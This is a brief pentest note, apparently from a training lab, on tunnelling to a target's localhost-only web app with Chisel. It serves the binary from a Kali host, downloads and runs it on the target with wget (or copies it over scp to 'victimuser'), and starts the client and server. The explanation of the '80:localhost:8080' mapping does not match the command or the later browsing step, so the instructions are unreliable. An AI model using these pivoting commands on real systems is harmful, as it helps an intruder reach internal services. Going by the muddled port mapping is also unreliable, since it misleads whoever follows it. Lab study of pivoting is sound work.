Scenario - There is a webapp running on localhost on the target and you need to access from your local machine
Solution - Chisel

Chisel is a fast TCP/UDP tunnel over HTTP, secured with SSH-like encryption. It’s useful for more complex scenarios 
or when SSH port forwarding isn’t sufficient (e.g., if you need to share access or bypass restrictions). Below is 
the process to set up Chisel for your use case.

####Install Chisel on  your Kali machine (192.168.45.184) and copy to the server (192.168.238.103).
  kali>
sudo apt update
sudo apt install chisel
python3 -m http.server 8000
  kali/>
  server>
wget http://192.168.45.184:8000/chisel -O /tmp/chisel
chmod +x /tmp/chisel
/tmp/chisel --version
  server/>
#####Start the Chisel Server on the Linux Machine listening on port 9000(change if needed):
  server>
/tmp/chisel server --port 9000
  server/>
#####On Kali, run the Chisel client to connect to the server and forward the webapp port. 192.168.238.103:9000: Chisel server’s IP and port. 80:localhost:8080: Maps port 80 on the server to port 8080 on Kali.
  kali>
chisel client 192.168.238.103:9000 80:localhost:8080
  kali/>
#####Access the Webapp
Open a browser on your Kali machine. Navigate to http://localhost:8080.
Stop the Chisel client on Kali with Ctrl+C.
Stop the Chisel server on the server: pkill chisel

#Alternative commands to transfer chisel
From Kali
scp /tmp/chisel victimuser@192.168.238.103:/tmp/chisel







